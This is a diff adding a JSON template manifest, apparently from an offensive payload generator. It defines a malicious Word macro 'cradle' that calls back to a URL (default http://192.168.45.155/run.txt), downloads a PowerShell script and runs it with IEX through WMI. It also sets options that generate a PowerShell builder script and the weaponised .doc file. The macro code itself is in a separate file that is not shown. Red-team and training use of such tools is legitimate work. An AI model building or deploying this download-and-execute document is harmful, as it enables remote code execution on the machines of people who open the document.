@@ -1,0 +1,35 @@
+
+
+{
+    "categories" : ["Word","Cradle"],
+    "description" : "Word macro that calls back to IEX a posh script. Uses wmi will be 64bit process running IEX.",
+    "contentFile" : "worddechainedcradle.txt",
+    
+    "customAttributes" : [
+        {
+            "name":"callbackURL",
+            "description" : "The URL to call back to grab the posh script.",
+            "defaultValue" : "http://192.168.45.155/run.txt"   
+        }
+    ],
+
+    "shellCode" : {
+        "hasShellCode":false
+    },
+    "compilation": {
+      "compilationType": "macro",
+      "compilationAttributes": [
+        {
+          "name": "saveAs",
+          "description": "Name of the powershell file to be created, can be full path or just a name",
+          "defaultValue": "gendoc.ps1"
+        },
+        {
+          "name": "wordDocOut",
+          "description": "Name of the word doc file to be created by the powershell script.",
+          "defaultValue": "doc.doc"
+        }
+      ]
+    },
+    "runHint" : "If wordDocOut is relative it it'll end up in the current users documents folder."
+}
